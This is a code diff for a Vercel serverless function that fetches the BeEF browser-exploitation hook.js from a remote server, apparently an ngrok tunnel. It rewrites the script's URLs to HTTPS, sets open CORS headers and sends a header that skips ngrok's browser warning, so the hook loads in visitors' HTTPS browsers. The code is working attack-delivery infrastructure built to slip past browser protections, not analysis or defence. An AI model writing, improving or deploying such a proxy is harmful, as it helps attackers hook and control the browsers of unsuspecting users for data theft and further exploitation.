@@ -1,13 +1,17 @@
 /**
- * Vercel Serverless Function - Proxy for BeEF hook.js
- * Bypasses CORS and ngrok warnings by fetching hook.js server-side
+ * Vercel Serverless Function - Robust Proxy for BeEF hook.js
+ * Replaces http:// and protocol-relative // references to the configured BEEF server
  */
 
+function escapeRegExp(string) {
+  return string.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+}
+
 export default async function handler(req, res) {
-  // Set CORS headers
+  // CORS + basic headers
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
-  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
   res.setHeader("Content-Type", "application/javascript");
   res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
 
@@ -22,7 +26,6 @@ export default async function handler(req, res) {
   }
 
   const beefServerUrl = process.env.BEEF_SERVER_URL;
-
   if (!beefServerUrl) {
     console.error("BEEF_SERVER_URL environment variable not set");
     res
@@ -31,9 +34,23 @@ export default async function handler(req, res) {
     return;
   }
 
+  // Validate and normalize the configured URL
+  let beefUrl;
   try {
-    // Fetch hook.js from BeEF server with ngrok bypass headers
-    const response = await fetch(`${beefServerUrl}/hook.js`, {
+    beefUrl = new URL(beefServerUrl);
+  } catch (e) {
+    console.error("Invalid BEEF_SERVER_URL:", beefServerUrl);
+    res.status(500).send("// Configuration error: invalid BeEF server URL");
+    return;
+  }
+
+  const origin = beefUrl.origin.replace(/\/+$/, ""); // e.g. "https://95b27dbafdff.ngrok-free.app"
+  const hostname = beefUrl.hostname; // e.g. "95b27dbafdff.ngrok-free.app"
+  const escHost = escapeRegExp(hostname);
+
+  try {
+    // Fetch the original hook.js from the BeEF server
+    const response = await fetch(`${origin}/hook.js`, {
       headers: {
         "ngrok-skip-browser-warning": "true",
         "User-Agent":
@@ -45,39 +62,69 @@ export default async function handler(req, res) {
       console.error(
         `Failed to fetch hook.js: ${response.status} ${response.statusText}`
       );
-      res.status(502).send(`// Failed to fetch hook.js from BeEF server`);
+      res.status(502).send("// Failed to fetch hook.js from BeEF server");
       return;
     }
 
     let hookScript = await response.text();
 
-    // CRITICAL FIX: Replace all HTTP URLs with HTTPS to avoid mixed content errors
-    // BeEF hardcodes http:// in hook.js, but we need https:// for HTTPS sites
-    const httpUrl = beefServerUrl.replace("https://", "http://");
+    // --- Robust replacements ---
+    // 1) Replace `http://hostname(:port)?`
+    const httpHostRegex = new RegExp(`http:\\/\\/${escHost}(?::\\d+)?`, "g");
 
-    // Replace http://domain:3000 with https://domain (ngrok HTTPS doesn't need port)
-    hookScript = hookScript.replace(
-      new RegExp(
-        httpUrl.replace("http://", "http://").replace(/\//g, "\\/") + ":3000",
-        "g"
-      ),
-      beefServerUrl
-    );
+    // 2) Replace protocol-relative `//hostname(:port)?`
+    const protoRelRegex = new RegExp(`\\/\\/${escHost}(?::\\d+)?`, "g");
 
-    // Also replace any plain http://domain references
-    hookScript = hookScript.replace(
-      new RegExp(httpUrl.replace(/\//g, "\\/"), "g"),
-      beefServerUrl
+    // 3) Replace bare `hostname:port` occurrences (rare, but sometimes embedded)
+    const hostPortRegex = new RegExp(`${escHost}:\\d+`, "g");
+
+    // Count occurrences (for logging)
+    const countHttpHost = (hookScript.match(httpHostRegex) || []).length;
+    const countProtoRel = (hookScript.match(protoRelRegex) || []).length;
+    const countHostPort = (hookScript.match(hostPortRegex) || []).length;
+
+    // Perform replacements -> replace with full origin (https://host or https://host:port)
+    if (countHttpHost) hookScript = hookScript.replace(httpHostRegex, origin);
+    if (countProtoRel) hookScript = hookScript.replace(protoRelRegex, origin);
+    if (countHostPort) {
+      // replace with origin without scheme when needed (e.g. host:3000 -> host:3000 replaced by origin host[:port])
+      // here we replace bare host:port with origin (may add scheme which is OK for hook.js)
+      hookScript = hookScript.replace(
+        hostPortRegex,
+        origin.replace(/^https?:\/\//, "")
+      );
+    }
+
+    // Extra: Replace any stray `http://<origin-without-scheme>` with origin
+    const originWithoutScheme = escapeRegExp(
+      origin.replace(/^https?:\/\//, "")
     );
+    const httpFullOriginRegex = new RegExp(
+      `http:\\/\\/${originWithoutScheme}`,
+      "g"
+    );
+    if ((hookScript.match(httpFullOriginRegex) || []).length) {
+      hookScript = hookScript.replace(httpFullOriginRegex, origin);
+    }
 
     console.log(
-      `Proxied hook.js, replaced HTTP with HTTPS for: ${beefServerUrl}`
+      `Proxied hook.js from ${origin} — replacements: http:${countHttpHost}, protoRel:${countProtoRel}, hostPort:${countHostPort}`
     );
 
-    // Return the modified hook.js content
+    // Basic sanity check: ensure we are returning JS (not an HTML error page)
+    const maybeHtml = /<html|<!doctype html/i.test(hookScript);
+    if (maybeHtml) {
+      console.warn(
+        "Fetched hook.js looks like HTML (possible error page). Returning it anyway."
+      );
+      // Optionally: return an error instead:
+      // res.status(502).send("// Error: fetched resource was not JavaScript");
+      // return;
+    }
+
     res.status(200).send(hookScript);
   } catch (error) {
-    console.error("Error fetching hook.js:", error.message);
+    console.error("Error fetching or processing hook.js:", error);
     res.status(502).send(`// Error: ${error.message}`);
   }
 }
